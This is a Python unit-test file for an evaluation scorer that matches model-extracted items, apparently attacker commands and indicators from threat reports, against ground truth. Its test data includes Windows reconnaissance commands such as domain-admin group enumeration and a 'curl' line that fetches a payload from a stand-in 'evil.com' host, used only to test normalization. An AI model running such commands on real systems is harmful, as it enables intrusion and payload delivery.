"""Unit tests for src.services.eval_item_scorer.score_items.

Covers the normalization rules and the boundary cases that the wire-up in
agentic_workflow.py depends on (especially the zero-extraction case where the
model returned no items but expected_items still has ground truth).
"""

import pytest

from src.services.eval_item_scorer import ItemScorerResult, calculate_f_beta, score_items


@pytest.mark.unit
def test_exact_match_full_recall():
    expected = ["whoami /groups", 'net group "domain admins" /domain']
    actual = ["whoami /groups", 'net group "domain admins" /domain']
    result = score_items(expected, actual)
    assert result.precision == 1.0
    assert result.recall == 1.0
    assert result.matched_count == 2
    assert result.missed_count == 0
    assert result.extra_count == 0


@pytest.mark.unit
def test_case_insensitive_normalization():
    """Lowercase normalization means casing differences match."""
    expected = ['NET GROUP "Domain Admins" /domain']
    actual = ['net group "domain admins" /domain']
    result = score_items(expected, actual)
    assert result.matched_count == 1
    assert result.missed_count == 0


@pytest.mark.unit
def test_whitespace_collapse_normalization():
    """Internal whitespace runs collapse to single spaces."""
    expected = ["dir   >    out.txt"]
    actual = ["dir > out.txt"]
    result = score_items(expected, actual)
    assert result.matched_count == 1


@pytest.mark.unit
def test_ioc_defang_normalization():
    """[.] and [:] defang markers are normalized to . and : on both sides."""
    expected = ["curl http://evil[.]com/payload"]
    actual = ["curl http://evil.com/payload"]
    result = score_items(expected, actual)
    assert result.matched_count == 1


@pytest.mark.unit
def test_zero_extraction_against_nonempty_expected():
    """Critical case: model returned no items but ground truth has 9 items.

    This is the regression case from agentic_workflow.py -- when the scorer
    was being skipped entirely for actual_items=[] runs, zero-extraction
    runs silently became 'count only' instead of being scored as 0% recall.
    """
    expected = [f"item-{i}" for i in range(9)]
    actual: list[str] = []
    result = score_items(expected, actual)
    assert result.matched_count == 0
    assert result.missed_count == 9
    assert result.extra_count == 0
    assert result.precision == 0.0
    assert result.recall == 0.0


@pytest.mark.unit
def test_empty_expected_with_extras():
    """No ground truth + agent emitted items -- precision must not divide by zero."""
    expected: list[str] = []
    actual = ["whoami /groups", "ipconfig /all"]
    result = score_items(expected, actual)
    assert result.matched_count == 0
    assert result.missed_count == 0
    assert result.extra_count == 2
    assert result.precision == 0.0  # 0 / (0 + 2)
    assert result.recall == 0.0  # 0 / (0 + 0) -> defined as 0 here


@pytest.mark.unit
def test_partial_match_precision_recall():
    expected = ["a", "b", "c", "d"]
    actual = ["a", "b", "x"]  # 2 matched, 1 extra, 2 missed
    result = score_items(expected, actual)
    assert result.matched_count == 2
    assert result.missed_count == 2
    assert result.extra_count == 1
    # Precision = 2 / 3 = 0.6667; Recall = 2 / 4 = 0.5
    assert result.precision == 0.6667
    assert result.recall == 0.5


@pytest.mark.unit
def test_calculate_f_beta_defaults_to_precision_weighted_f05():
    assert calculate_f_beta(2 / 3, 0.5) == pytest.approx(0.625)


@pytest.mark.unit
def test_duplicates_dedup_to_single_match():
    """Same expected item listed twice on either side counts once."""
    expected = ["whoami /groups", "whoami /groups"]
    actual = ["whoami /groups"]
    result = score_items(expected, actual)
    assert result.matched_count == 1
    assert result.missed_count == 0
    assert result.extra_count == 0


@pytest.mark.unit
def test_returns_dataclass_with_lists():
    """Sanity check: result shape includes the matched/missed/extra item lists,
    not just counts -- the UI uses them for the missed-items modal."""
    expected = ["a", "b"]
    actual = ["a", "z"]
    result = score_items(expected, actual)
    assert isinstance(result, ItemScorerResult)
    assert result.matched == ["a"]
    assert result.missed == ["b"]
    assert result.extra == ["z"]
